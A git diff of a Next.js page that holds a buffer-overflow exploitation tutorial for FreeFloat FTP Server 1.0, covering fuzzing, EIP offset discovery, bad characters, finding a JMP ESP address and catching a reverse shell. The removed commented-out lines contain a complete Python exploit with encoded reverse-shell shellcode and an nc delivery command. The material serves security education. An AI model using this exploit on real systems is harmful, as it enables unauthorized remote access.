@@ -1,21 +1,34 @@
 'use client';
 import React from 'react'
+import Image from 'next/image';
 
 
 const page = () => {
     return (
-        <div className='w-full my-32 sm:my-48 px-8 sm:px-32 overflow-hidden'>
-            <h1 className='text-4xl sm:text-6xl my-8 tracking-tighter'>Buffer Overflow Exploitation in FreeFloat FTP Server</h1>
+        <div className='w-full my-32 sm:mt-48 px-8 sm:px-32 overflow-hidden'>
+            <h1 className='text-4xl sm:text-6xl my-8 tracking-tighter'>Buffer Overflow Exploitation in FreeFloat FTP Server - <span className='text-blue-600'>Steflan Security</span></h1>
+            <hr className='h-[12px]' />
 
-            <iframe
-                src="/Buffer-overflow.pdf"
-                className='w-full h-[600px] sm:h-[1000px] border-none'
-            />
+            <h2 className='text-2xl sm:text-3xl tracking-tighter my-2 pt-12'>Stack Buffer Overflow Theory</h2>
+            <p className='my-4'>Stack buffer overflow is a memory corruption vulnerability that occurs when a program writes more data to a buffer located on the stack than what is actually allocated for that buffer, therefore overflowing to a memory address that is outside of the intended data structure.</p>
+            <p className='my-4'>This will often cause the program to crash, and if certain conditions are met, it could allow an attacker to gain remote control of the machine with privileges as high as the user running the program, by redirecting the flow execution of the application to malicious code.</p>
+            <p className='my-4'>Before diving into an actual attack, it is crucial to understand basic concepts of C programming such as memory, the stack, CPU registers, pointers and what happens behind the scenes, in order to take advantage of a memory corruption to compromise a system.</p>
 
-            {/* <h2 className='text-2xl sm:text-3xl tracking-tighter my-2 pt-12'>Stack Buffer Overflow Theory</h2>
-            <p>Stack buffer overflow is a memory corruption vulnerability that occurs when a program writes more data to a buffer located on the stack than what is actually allocated for that buffer, therefore overflowing to a memory address that is outside of the intended data structure.</p>
-            <p>This will often cause the program to crash, and if certain conditions are met, it could allow an attacker to gain remote control of the machine with privileges as high as the user running the program, by redirecting the flow execution of the application to malicious code.</p>
-            <p>Before diving into an actual attack, it is crucial to understand basic concepts of C programming such as memory, the stack, CPU registers, pointers and what happens behind the scenes, in order to take advantage of a memory corruption to compromise a system.</p>
+            <div className="my-4 pt-16 mx-auto text-center">
+                <h3 className='text-lg sm:text-xl'>Memory</h3>
+                <Image src="/assets/security/buffer-overflow/stack-overview.webp" alt="Stack overview" className='mx-auto ' width={500} height={475} />
+            </div>
+
+            <p className='my-2'>Normally, a process is allocated a certain amount of memory which contains all of the necessary information it requires to run, such as the code itself and any DLLs, which isn’t shared with other processes.</p>
+            <p className='my-2'>Whenever an executable is run, its code is loaded into memory so that it can perform all the tasks that is has been programmed to do, because all of the instructions are loaded onto the program’s memory, this can be changed thus making the application perform unintended actions.</p>
+            <p className='my-2'>All variables in memory are stored using either little endian (for intel x86 processors) or big endian (for PowerPC) format.</p>
+            <p className='my-2'>In little endian, the bytes are stored in reverse order. So for example:</p>
+            <ul className='my-8 mx-auto sm:px-24'>
+                <li><strong>0x032CFBE8</strong> will be stored as <strong>“E8FB2C03”</strong></li>
+                <li><strong>0x7734BC0D</strong> will be stored as <strong>“0DBC3477”</strong></li>
+                <li><strong>0x0BADF00D</strong> will be stored as <strong>“0DF0AD0B”</strong></li>
+            </ul>
+
 
             <h2 className='text-xl sm:text-3xl tracking-tighter my-2 pt-12'>The Stack</h2>
             <p>The stack is a section of memory that stores temporary data, that is executed when a function is called.</p>
@@ -44,7 +57,7 @@ const page = () => {
 
             <h2 className='text-xl sm:text-3xl tracking-tighter my-2 pt-12'>Common Instructions</h2>
             <p>This section covers some of the most common assembly instructions, their purpose in a program and some example uses:</p>
-            <ul>
+            <ul className='my-8 mx-auto sm:px-24'>
                 <li><strong>Pointers and Dereferencing</strong>: Since registers simply store values, they may or may not be used as pointers, depending on the information stored. If being used as a pointer, registers can be dereferenced, retrieving the value stored at the address being pointed to. Example: Movq, movb.</li>
                 <li><strong>Doing nothing</strong>: The NOP instruction, short for “no operation”, simply does nothing. Example: NOP.</li>
                 <li><strong>Moving data around</strong>: Used to move values and pointers. Example: Mov, movsx, movzx, lea.</li>
@@ -56,6 +69,9 @@ const page = () => {
             <h2 className='text-xl sm:text-3xl tracking-tighter my-2 pt-12'>Stack Buffer Overflow Process</h2>
             <p>Although applications require a custom exploit to be crafted in order to gain remote access, most stack buffer overflow exploitation, at a high level, involve the following phases:</p>
             <p>The next section will cover these phases in great detail, from both a theoretical and practical standpoint.</p>
+            <Image src="/assets/security/buffer-overflow/buffer-overflow-process.png" alt="Buffer overflow process" className='mx-auto mt-6' width={700} height={500} />
+            <p className='my-1 text-xs mx-auto text-center font-normal text-blue-600'>All credits to steflan security.</p>
+
 
             <h2 className='text-xl sm:text-3xl tracking-tighter my-2 pt-12'>Practical Example </h2>
             <p>This practical example will demonstrate how to exploit a stack buffer overflow vulnerability that affected FreeFloat FTP Server 1.0, an FTP server application. According to the exploit’s author, the crash occurs when sending the following information to the server:</p>
@@ -66,94 +82,244 @@ const page = () => {
             </ul>
             <p>The entire exploitation process will be conducted using Immunity Debugger, which is free.</p>
 
-            <h3 className='text-xl sm:text-3xl tracking-tighter my-2 pt-12'>Crashing the application</h3>
+            <h2 className='text-xl sm:text-3xl tracking-tighter my-2 pt-12'>Crashing the application</h2>
             <p>First of all, we have to cause the application to crash, in order to ascertain there is a buffer overflow vulnerability and this can be further exploited to gain remote access.</p>
             <p>Once the FreeFloat FTP Server executable has been downloaded, it can be run by double-clicking it:</p>
             <p>This will start the FTP server and open port 21 for incoming connections.</p>
             <p>Starting the Immunity Debugger, selecting the File → Attach option to attach it to the FreeFloat FTP process:</p>
-            <img src="/path/to/your/diagram1.png" alt="Diagram 1" />
+            <Image src="/assets/security/buffer-overflow/starting.png" alt="Starting debugger" className='mx-auto my-6' width={500} height={475} />
             <p>Once the debugger has been attached to the process, it will enter a pause state. In order to start its execution, the Debug → Run option can be used:</p>
-            <img src="/path/to/your/diagram2.png" alt="Diagram 2" />
+            <Image src="/assets/security/buffer-overflow/running.png" alt="Running debugger" className='mx-auto my-6' width={600} height={475} />
             <p>Immunity Debugger uses the following panes used to display information:</p>
-            <ul>
-                <li>Top-Left Pane – It contains the instruction offset, the original application code, its assembly instruction and comments added by the debugger.</li>
-                <li>Bottom-Left Pane – It contains the hex dump of the application itself.</li>
-                <li>Top-Right Pane – It contains the CPU registers and their current value.</li>
-                <li>Bottom-Right Pane – It contains the stack and its current values.</li>
+            <ul className='my-8 mx-auto sm:px-24'>
+                <li><strong>Top-Left Pane</strong> – It contains the instruction offset, the original application code, its assembly instruction and comments added by the debugger.</li>
+                <li><strong>Bottom-Left Pane</strong> – It contains the hex dump of the application itself.</li>
+                <li><strong>Top-Right Pane</strong> – It contains the CPU registers and their current value.</li>
+                <li><strong>Bottom-Right Pane</strong> – It contains the stack and its current values.</li>
             </ul>
-            <p className='mb-4'>After running the executable and selecting the Debug → Run option, the server can be interacted with by using the netcat tool. To do so, simply execute the following command:</p>
-            <code className='text-xs sm:text-sm font-bold bg-gray-200 px-2' >nc [target_ip] 21</code>
-            <p className='my-4'>Sending the string that triggers the crash will have the following format:</p>
-            <code className='text-xs sm:text-sm font-bold bg-gray-200 px-2'>USER hacker<br />PASS pass<br />REST AAAA..</code>
-            <p className='mt-4'>The process will now enter a paused state in Immunity Debugger.</p>
+            <p className='mb-4'>Python can be used to generate a buffer of 300 A characters to test the crash. Establishing
+                a TCP connecting with port 21 using Netcat, logging in with test/test and sending REST plus
+                the buffer created using Python to cause the crash:</p>
 
-            <h3 className='text-lg sm:text-3xl tracking-tighter my-2 pt-12'>Finding the offset </h3>
-            <p>When the process crashes, we can see the value stored in the EIP register and the current instruction offset:</p>
-            <img src="/path/to/your/diagram3.png" alt="Diagram 3" />
-            <p>By checking the value of the EIP register we can see that it contains 41414141, which is the ASCII value for “AAAA”. This means that the value we used to overflow the buffer was used to overwrite the return address of the program.</p>
-            <p>In order to identify the exact point at which the overflow occurs, we will use a pattern matching tool called pattern_create.rb to create a unique pattern of 500 bytes.</p>
-            <p>This pattern will then be sent to the FTP server to crash the process again.</p>
-            <p className='mb-4'>Using the command:</p>
-            <code className='text-xs sm:text-sm font-bold bg-gray-200 px-2'>/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 500</code>
-            <p className='mt-4'>Copy the pattern created by the tool and replace the 300+ bytes in the original request with the pattern. This pattern will allow us to identify the exact point of the overflow. Once the FTP server crashes, Immunity Debugger will show the value that overwrites the EIP register.</p>
+            <Image src="/assets/security/buffer-overflow/sending-buffer.png" alt="Sending Buffer" className='mx-auto my-6' width={600} height={475} />
+            <p className='my-4'>This has crashed the program and Immunity Debugger has reported an access violation error:</p>
+            <Image src="/assets/security/buffer-overflow/examining-in-immunity.webp" alt="Examining Buffer in Immunity" className='mx-auto my-6' width={600} height={475} />
+            <p className='my-4'>The EIP register was overwritten with the 300 x41 (which corresponds to A in ASCII) sent
+                through Netcat:</p>
+            <Image src="/assets/security/buffer-overflow/overwriting-eip.webp" alt="Overwriting EIP" className='mx-auto my-6' width={600} height={475} />
+            <p className='my-4'>Since EIP stores the next instruction to be executed by the application and we established
+                we can manipulate its value, this can be exploited by redirecting the flow of the program
+                execution to ESP, which can be injected with malicious code.</p>
+            <p className='my-4'>The fuzzing process can also automated through the use of a Python fuzzer, by sending
+                incremental amounts of data in order to identify exactly at which point the application will
+                crash and therefore stop responding. To connect to the application through Netcat, the following script can be used:
+            </p>
+            <Image src="/assets/security/buffer-overflow/fuzzing-script.jpeg" alt="Fuzzing script" className='mx-auto my-6' width={800} height={500} />
 
-            <h3 className='text-xl sm:text-3xl tracking-tighter my-2 pt-12'>Redirecting execution flow</h3>
-            <p>To redirect the flow of execution to our shellcode, we will need to overwrite the EIP register with a pointer to a memory location that contains a JMP ESP instruction.</p>
-            <p>The following immunity debugger script can be used to find a memory location with a JMP ESP instruction:</p>
-            <pre>!mona jmp -r esp</pre>
-            <p>By using the address returned by the script, we will be able to overwrite the EIP register and redirect execution flow to our shellcode stored in the stack.</p>
 
-            <h3 className='text-xl sm:text-3xl tracking-tighter my-2 pt-12'>Crafting the payload</h3>
-            <p>The final payload will contain the following components:</p>
-            <ul>
-                <li>The initial 260 bytes of the buffer.</li>
-                <li>The 4 bytes to overwrite the EIP register with the address of the JMP ESP instruction.</li>
-                <li>The shellcode to spawn a reverse shell.</li>
-            </ul>
-            <p className='mb-12'>The final payload can be constructed using the following Python script:</p>
+            <h3 className='text-lg sm:text-3xl tracking-tighter my-2 pt-12'>Finding the EIP offset </h3>
+            <p className='my-4'>The next step required is to identify which part of the buffer that is being sent is landing in the EIP register, in order to then modify it to control the execution flow of the program. Because all that was sent was a bunch of As, at the moment there is no way to know what part has overwritten EIP.</p>
+            <p className='my-4'>The Metasploit msf-pattern_create tool can be used to create a randomly generated string that will be replacing the A characters in order to identify which part lands in EIP. Creating a pattern of 300 characters using msf-pattern_create to keep the same buffer length:</p>
+            <Image src="/assets/security/buffer-overflow/creating-pattern.png" alt="Creating msf pattern" className='mx-auto my-6' width={600} height={475} />
+            <p className='my-4'>Adding the pattern to the buffer variable in the script, instead of sending the “A” characters:</p>
+            <Image src="/assets/security/buffer-overflow/pattern-exploit.jpeg" alt="Sending pattern" className='mx-auto my-6' width={800} height={500} />
+            <p className='my-4'>Restarting the application, re-attaching Immunity Debugger and running the script:</p>
+            <Image src="/assets/security/buffer-overflow/running-script.png" alt="Running the script" className='mx-auto my-6' width={600} height={475} />
+            <p className='my-4'>The randomly generated pattern was sent instead of the A characters.
+                The application crashed with an access violation error as expected, but this time, the EIP
+                register was overwritten with “41326941”.</p>
+            <Image src="/assets/security/buffer-overflow/eip-41326941.webp" alt="EIP overwritten with 41326941" className='mx-auto my-6' width={600} height={475} />
+            <p className='my-4'>The Metasploit msf-pattern_offset tool can then be used to find the EIP value in the pattern
+                created earlier to calculate the exact EIP offset i.e. the exact location of EIP, which in this
+                case is at byte 246.</p>
+            <Image src="/assets/security/buffer-overflow/offset-match.png" alt="Matching offset" className='mx-auto my-6' width={500} height={475} />
+            <p className="my-4">Modifying the script to override EIP with four “B” characters instead of the As in order to verify whether the last test was successful:</p>
+            <Image src="/assets/security/buffer-overflow/adding-Bs.jpeg" alt="Adding BBBB" className='mx-auto my-6' width={800} height={500} />
+            <p className='my-4'>Restarting the application, re-attaching Immunity Debugger and running the script:</p>
+            <Image src="/assets/security/buffer-overflow/running-script2.png" alt="Running the script" className='mx-auto my-6' width={600} height={475} />
+            <p className="my-4">As expected, the EIP registry was overwritten with the four “B” characters:</p>
+            <Image src="/assets/security/buffer-overflow/eip-42424242.webp" alt="EIP overwritten with 42424242" className='mx-auto my-6' width={600} height={475} />
+            <p className="my-4">Now that we have full control over EIP, it can be exploited to change redirect the application execution to certain instructions.</p>
+
+
+
+            <h2 className='text-2xl sm:text-3xl tracking-tighter my-2 pt-12'>Finding Available Shellcode Space</h2>
+            <p className='my-4'>The purpose of this step is to find a suitable location in the memory for our shellcode to then redirect the program execution to it. </p>
+            <p className='my-4'>When the last script was executed, the C characters that were used to keep the buffer size as 300 overflowed into ESP, so this could be a good place to insert the shellcode:</p>
+            <Image src="/assets/security/buffer-overflow/esp-CCCC.webp" alt="ESP overwritten with CCCC" className='mx-auto my-6' width={600} height={475} />
+            <p className='my-4'>We can tell the C characters sent to the application landed in ESP from the fifth one onward because ESP’s address is 0064FBE8, which corresponds to the second group of Cs.</p>
+            <p className='my-4'>We now have to verify whether there is enough space for the shellcode inside ESP, which is what will be executed by the system by the program in order to gain remote access. A normal reverse shell payload is normally about 300-400 bytes, and because only 50 Cs were sent we cannot tell whether there is enough space for it in ESP.</p>
+            <p className='my-4'>Modifying the script, adding about 550 C characters to the script in a new shellcode variable:</p>
+            <code className='font-bold bg-gray-200 px-2'>shellcode = "C" * (800 - (len(offset) -len(EIP))) #Shellcode placeholder using about 550 Cs</code>
+            <Image src="/assets/security/buffer-overflow/adding-550Cs.jpeg" alt="Modifying script" className='mx-auto my-6' width={800} height={500} />
+            <p className="my-4">Restarting the application, re-attaching Immunity Debugger and running the script. All the “C” characters that were sent by the script have overwritten ESP:</p>
+            <Image src="/assets/security/buffer-overflow/ESP-overwritten.webp" alt="Running the script" className='mx-auto my-6' width={800} height={600} />
+            <p className="my-4">To calculate how many C characters made it into ESP, all we need to do is subtract the address where ESP starts to the one where the Cs end.</p>
+            <h3 className='font-bold text-center mx-auto'>Beginning of ESP:</h3>
+            <Image src="/assets/security/buffer-overflow/beginning-esp.webp" alt="Beginning of ESP" className='mx-auto my-6' width={600} height={475} />
+            <h3 className='font-bold text-center mx-auto'>End of Cs:</h3>
+            <Image src="/assets/security/buffer-overflow/end-of-Cs.webp" alt="End of Cs" className='mx-auto my-6' width={600} height={475} />
+            <p className="my-4">Calculating the difference between the two memory addresses using Python, all of the C
+                characters made it into ESP which makes it a suitable shellcode location. </p>
+            <Image src="/assets/security/buffer-overflow/calculating-difference.png" alt="Calculating difference" className='mx-auto my-6' width={600} height={475} />
+
+
+            <h2 className='text-2xl sm:text-3xl tracking-tighter my-2 pt-12'>What if there is not enough space?</h2>
+            <p className="my-4">If there is not enough space in the ESP register to insert our shellcode, this can be
+                circumvented by using a first stage payload. Since we should be able to override at least the
+                first few characters of ESP, this will be enough to instruct it to jump to a different register
+                where the shellcode will be placed.</p>
+            <p className="my-4">If a different register points to the beginner of the buffer, for example ECX:</p>
+            <Image src="/assets/security/buffer-overflow/ECX-overwritten.webp" alt="ECX overwritten" className='mx-auto my-6' width={500} height={475} />
+            <p className="my-4">Then the opcode used to perform a JMP ECX instruction can be generated:</p>
+            <Image src="/assets/security/buffer-overflow/jmp-ecx.png" alt="JMP ECX" className='mx-auto my-6' width={500} height={475} />
+            <p className="my-4">And added to the script, in order to instruct ESP to jump to ECX:</p>
             <pre>
-                <code className='text-xs sm:text-sm font-bold bg-gray-200 px-2 overflow-x-scroll sm:overflow-x-auto'>
-                    import struct
-
-                    buffer = "A" * 260
-
-                    eip = struct.pack("I", 0x625011af) # Address of JMP ESP instruction
-                    shellcode = ("\xdb\xd4\xba\x88\xb1\x10\xca\xd9\x74\x24\xf4\x5e\x33\xc9\xb1"
-                    "\x52\x31\x56\x17\x03\x56\x17\x83\xca\x91\x36\x27\xf6\x72\x34"
-                    "\xc8\xf6\x83\x59\x40\x13\xb2\x59\x36\x50\xe5\x69\x3c\x34\x0a"
-                    "\x01\x10\xac\x99\x67\xbd\xc3\x2a\xcd\x9b\xea\xab\x7e\xdf\x6d"
-                    "\x2f\x7d\x0c\x4d\x0e\x4e\x41\x8c\x57\xb3\xa8\xdc\x00\xbf\x1f"
-                    "\xf0\x25\xf5\xa3\x7b\x75\x1b\xa4\x98\xce\x1a\x85\x0f\x44\x45"
-                    "\x05\xae\x89\xfd\x0c\xa8\xce\x38\xc6\x43\x24\xb6\xd9\x85\x74"
-                    "\x37\x75\xe8\xb8\xca\x87\x2d\x7e\x35\xf2\x47\x7c\xc8\x05\x9c"
-                    "\xfe\x16\x83\x06\x58\xdc\x33\xe2\x58\x31\xa5\x61\x56\xfe\xa1"
-                    "\x2e\x7a\x01\x65\x45\x86\x8a\x88\x89\x0e\xc8\xae\x0d\x4a\x8a"
-                    "\xcf\x14\x36\x7d\xef\x46\x99\x22\x55\x0d\x34\x36\xe4\x4c\x51"
-                    "\xfb\xc5\x6e\xa1\x93\x5e\x1d\x93\x3c\xf5\x89\x9f\xb5\xd3\x4e"
-                    "\xdf\xef\xa4\xc0\x1e\x10\xd5\xc9\xe4\x44\x85\x61\xcc\xe4\x4e"
-                    "\x71\xf1\x30\xc0\x21\x5d\xeb\xa1\x91\x1d\x5b\x4a\xfb\x91\x84"
-                    "\x6a\x04\x78\xad\x01\xff\xeb\x72\x7d\xe5\x10\x1b\x7c\x05\x05"
-                    "\x76\x09\xe3\x6f\x96\x5f\xbc\x07\x0f\xfa\x36\xb9\xd0\xd0\x33"
-                    "\xf9\x5b\xd7\xc4\xb4\xab\x92\xd6\x21\x5c\xe9\x84\xe4\x63\xc7"
-                    "\xa0\x6b\xf1\x8c\x30\xe5\xea\x1a\x67\xa2\xdd\x52\xed\x5e\x47"
-                    "\xcd\x13\xa3\x11\x36\x97\x78\xe2\xb9\x16\x0c\x5e\x9e\x08\xc8"
-                    "\x5f\x9a\x7c\x84\x36\x74\x2a\x62\xe1\x36\x84\x3c\x5e\x91\x40"
-                    "\xb8\xac\x22\x16\xc5\xf8\xd4\xf6\x74\x55\xa1\x09\xb8\x31\x25"
-                    "\x72\xa4\xa1\xca\xa9\x6c\xd1\x80\xef\xc5\x7a\x4d\x7a\x54\xe7"
-                    "\x6e\x51\x99\x1e\xed\x53\x62\xe5\xed\x16\x67\xa1\xa9\xcb\x15"
-                    "\xba\x5f\xeb\x8a\xbb\x75")
-                    buffer += eip + "\x90" * 20 + shellcode
-                    print buffer
+                <code className='font-semibold bg-gray-200 px-2'>
+                    offset = "A" * 246 #defining the offset value{'\n'}
+                    EIP = "B" * 4 #EIP placeholder{'\n'}
+                    first_stage = "\xff\xe1" #defining first stage payload as the JMP ECX instruction{'\n'}
+                    shellcode = "C" * (800 - (len(offset) -len(EIP))) #Shellcode placeholder using about 550 Cs
                 </code>
             </pre>
+            <Image src="/assets/security/buffer-overflow/jmp-ecx-script.jpeg" alt="Adding JMP ECX" className='mx-auto my-6' width={800} height={500} />
+            <p className="my-4">In this scenario, the shellcode is added to the beginning of the buffer, since the register where
+                it is placed is the first one that our data is written to.</p>
+            <p className="my-4">So basically this is what happens when the exploit is run:</p>
+            <ol className='my-8 mx-auto sm:px-24 list-decimal'>
+                <li>The shellcode is written to ECX.</li>
+                <li>The buffer causes the application to crash.</li>
+                <li>EIP is overwritten with a JMP ESP instruction which redirects the execution flow to ESP.</li>
+                <li>ESP performs a JMP ECX instruction, redirecting the execution to ECX.</li>
+                <li>The shellcode stored in ECX is then executed.</li>
+            </ol>
 
 
-            <h3 className='text-xl sm:text-3xl tracking-tighter my-2 pt-12'>Exploiting the vulnerability </h3>
-            <p>By sending the payload to the FTP server, the EIP register will be overwritten with the address of the JMP ESP instruction, redirecting the execution flow to the shellcode. This will spawn a reverse shell on the target machine.</p>
-            <p className='mb-8'>The following command can be used to send the payload to the FTP server:</p>
-            <code className='text-xs sm:text-sm font-bold bg-gray-200 px-2'>python -c "print 'USER anonymous\\r\\nPASS anonymous\\r\\nREST ' + buffer + '\\r\\n'" | nc [target_ip] 21</code>
 
-            <p className='mt-8'>Note: Replace [target_ip] with the IP address of the target machine.</p> */}
+            <h2 className='text-2xl sm:text-3xl tracking-tighter my-2 pt-12'>Testing for Bad Characters</h2>
+            <p className="my-4">Some programs will often consider certain characters as “bad”, and all that means is that if
+                they come across one of them, this will cause a corruption of the rest of the data contained
+                in the instruction sent to the application, not allowing the program to properly interpret the it.
+                One character that is pretty much always considered bad is x00, as it is a null-byte and
+                terminates the rest of the application code.
+            </p>
+            <p className="my-4">In this phase all we have to do is identify whether there are any bad characters, so that we
+                can later on remove them from the shellcode. Modifying the script, adding all possible characters in hex format to a badchars variable and
+                sending it instead of the shellcode placeholder:</p>
+            <Image src="/assets/security/buffer-overflow/badchars-script.jpeg" alt="Adding badchars" className='mx-auto my-6' width={800} height={500} />
+            <p className="my-4">Restarting the application, re-attaching Immunity Debugger and running the script:</p>
+            <Image src="/assets/security/buffer-overflow/running-badchars.png" alt="Running badchars" className='mx-auto my-6' width={600} height={475} />
+            <p className="my-4">Right-clicking on the ESP value and selecting “Follow in Dump” to follow ESP in the application
+                dump and see if all the characters sent made it there:</p>
+            <Image src="/assets/security/buffer-overflow/following-ESP.webp" alt="Following ESP" className='mx-auto my-6' width={600} height={475} />
+            <p className="my-4">It looks like the characters stop displaying properly after x09, so this indicates that the next
+                character (x0A) is a bad character</p>
+            <Image src="/assets/security/buffer-overflow/badchars-found.webp" alt="Badchars found" className='mx-auto my-6' width={500} height={475} />
+            <p className="my-4">After removing x0A from the badchars variable and following the same process again, this time the characters stopped after x0C , so x0D is also bad</p>
+            <Image src="/assets/security/buffer-overflow/badchars-found2.webp" alt="Badchars found" className='mx-auto my-6' width={500} height={475} />
+            <p className="my-4">This time, all of the characters made it into the ESP dump, starting from x01 all the way to xFF, so the only bad characters are x00, x0A and x0D.</p>
+            <Image src="/assets/security/buffer-overflow/no-badchars-found.webp" alt="No Badchars found" className='mx-auto my-6' width={500} height={475} />
+
+
+            <h2 className='text-2xl sm:text-3xl tracking-tighter my-2 pt-12'>Finding a JMP ESP Return Address</h2>
+            <p className="my-4">Now that we can control EIP and found a suitable location for our shellcode (ESP), we need
+                to redirect the execution flow of the program to ESP, so that it will execute the shellcode. In
+                order to do this, we need to find a valid JMP ESP instruction address, which would allow us
+                to “jump” to ESP.
+            </p>
+            <p className="my-4">For the address to be valid, it must not be compiled with ASLR support and it cannot contain
+                any of the bad characters found above, as the program needs to be able to interpret the
+                address to perform the jump.
+            </p>
+            <p className="my-4">Restarting the application, re-attaching Immunity Debugger and using !mona modules
+                command to find a valid DLL/module:</p>
+            <Image src="/assets/security/buffer-overflow/finding-module.webp" alt="Finding module" className='mx-auto my-6' width={800} height={500} />
+            <p className="my-4">Finding a valid opcode for the JMP ESP instruction – FFE4 is what we require:</p>
+            <Image src="/assets/security/buffer-overflow/finding-jmp-esp.webp" alt="Finding JMP ESP" className='mx-auto my-6' width={800} height={500} />
+            <p className="my-4">Using the Mona find command to with to find valid pointers for the JMP ESP instruction:</p>
+            <Image src="/assets/security/buffer-overflow/finding-valid-pointer.png" alt="Finding JMP ESP" className='mx-auto my-6' width={800} height={500} />
+            <p className="my-4">It looks like a valid pointer was found (0x77EFCE33), and it does not contains any of the bad
+                characters.</p>
+            <p className="my-4">Copying the address and searching for it in the application instructions using the “follow
+                expression” Immunity feature to ensure it is valid. It looks like it does correspond to a valid JMP ESP instruction address:</p>
+            <Image src="/assets/security/buffer-overflow/valid-jmp-esp.png" alt="Valid JMP ESP" className='mx-auto my-6' width={800} height={500} />
+            <p className="my-4">Changing the script replacing the “B” characters used for the EIP register with the newly found
+                JMP ESP instruction address.</p>
+            <p className="my-4">The EIP return address has to be entered the other way around as explained in the memory
+                section, since little endian stores bytes in memory in reverse order.</p>
+            <Image src="/assets/security/buffer-overflow/adding-jmp-esp.jpeg" alt="Adding JMP ESP" className='mx-auto my-6' width={800} height={500} />
+            <p className="my-4">Breakpoints are used to stop the application execution when a certain memory location is
+                reached and they can be used to ensure the JMP ESP instruction is working correctly.</p>
+            <p className="my-4">Restarting the application, re-attaching Immunity Debugger and adding a breakpoint on the
+                JMP ESP instruction address by hitting F2, then starting the program execution.</p>
+            <p className="my-4">A breakpoint can also be added by right-clicking the memory location in the top-left pane,
+                and selecting the Breakpoint → Memory, on access option:</p>
+            <Image src="/assets/security/buffer-overflow/adding-breakpoint.png" alt="Adding breakpoint" className='mx-auto my-6' width={600} height={500} />
+            <p className="my-4">Executing the script again.</p>
+            <p className="my-4">When the application reaches the JMP ESP instruction, which is where the breakpoint was
+                added, the program execution stops as instructed. When single-stepping into the application execution using F7, this takes us to the C characters
+                which are the placeholder for our shellcode.</p>
+            <Image src="/assets/security/buffer-overflow/breakpoint-hit.png" alt="Breakpoint hit" className='mx-auto my-6' width={600} height={475} />
+
+
+
+            <h2 className='text-2xl sm:text-3xl tracking-tighter my-2 pt-12'>Generating and Adding Shellcode</h2>
+            <p className="my-4">At this point we can completely control the execution flow of the program, so all that is left to do
+                is add our shellcode to the exploit to trigger a reverse shell.</p>
+            <p className="my-4">The shellcode can be generated using MSFvenom with the following flags:</p>
+            <ul className='my-8 mx-auto sm:px-24 list-disc'>
+                <li>-p to specify the payload type, in this case the Windows reverse TCP shell</li>
+                <li>-(LHOST) to specify the local host IP address to connect to</li>
+                <li>-(LPORT) to specify the local port to connect to</li>
+                <li>-f to specify the format, in this case Python</li>
+                <li>-b to specify the bad characters, in this case \x00, \x0A and \x0D</li>
+                <li>-e to specify the encoder, in this case shikata_ga_nai</li>
+                <li>-v to specify the name of the variable used for the shellcode, in this case simply “shellcode”</li>
+            </ul>
+            <Image src="/assets/security/buffer-overflow/generating-shellcode.png" alt="Generating shellcode" className='mx-auto my-6' width={800} height={500} />
+            <p className="my-4">Because the shellcode is generated using an encoder (which purpose is basic antivirus evasion),
+                the program first needs to decode the shellcode before it can be run. This process will corrupt
+                the next few bytes of information contained in the shellcode, and therefore a few NOP Slides are
+                required to give the decoder enough time to decode it before it is executed by the program.
+            </p>
+            <p className="my-4">NOP Slides (No Operation Instructions) have a value of 0x90 and are used to pass execution to
+                the next instruction i.e. let CPU “slide” through them until the shellcode is reached.</p>
+            <p className="my-4">Adding the shellcode to the script, along with 20 NOP slides at the beginning of it to avoid errors
+                during the decoding phase:</p>
+            <Image src="/assets/security/buffer-overflow/adding-shellcode.jpeg" alt="Adding shellcode" className='mx-auto my-6' width={800} height={500} />
+
+
+
+
+
+            <h2 className='text-2xl sm:text-3xl tracking-tighter my-2 pt-12'>Gaining Remote Access</h2>
+            <p className="my-4">Once the final exploit has been assembled, the next step is to set up a Netcat listener, which will
+                catch our reverse shell when it is executed, using the following flags:</p>
+            <ul className='my-8 mx-auto sm:px-24 list-disc'>
+                <li>-l to listen for incoming connections</li>
+                <li>-v for verbose output</li>
+                <li>-n to skip the DNS lookup</li>
+                <li>-p to specify the port to listen on</li>
+            </ul>
+            <Image src="/assets/security/buffer-overflow/running-FTP-server.png" alt="Running FTP server" className='mx-auto my-6' width={800} height={500} />
+            <p className="my-4">Running the final Python exploit:</p>
+            <Image src="/assets/security/buffer-overflow/running-exploit.png" alt="Running exploit" className='mx-auto my-6' width={800} height={500} />
+            <p className="my-4">A call back was received and a reverse shell was granted as the “alpha” user. The privileges
+                granted by the exploit will always match the ones of the user owning the process.</p>
+            <Image src="/assets/security/buffer-overflow/reverse-shell.png" alt="Reverse shell" className='mx-auto my-6' width={800} height={500} />
+
+
+
+            <h2 className='text-2xl sm:text-3xl tracking-tighter my-2 pt-12'>Conclusion</h2>
+            <p className="my-4">Stack Buffer Overflow is one of the oldest and most common vulnerabilities exploited by
+                attackers to gain unauthorized access to vulnerable systems.</p>
+            <p className="my-4 mb-16">Control-flow integrity schemes should be implemented to prevent redirection to arbitrary code,
+                prevent execution of malicious code from the stack and randomize the memory space layout to
+                make it harder for attackers to find valid instruction addresses to jump to certain sectors of the
+                memory that may contain executable malicious code.
+            </p>
+
+            <hr className='h-[12px]'/>
         </div>
     )
 }
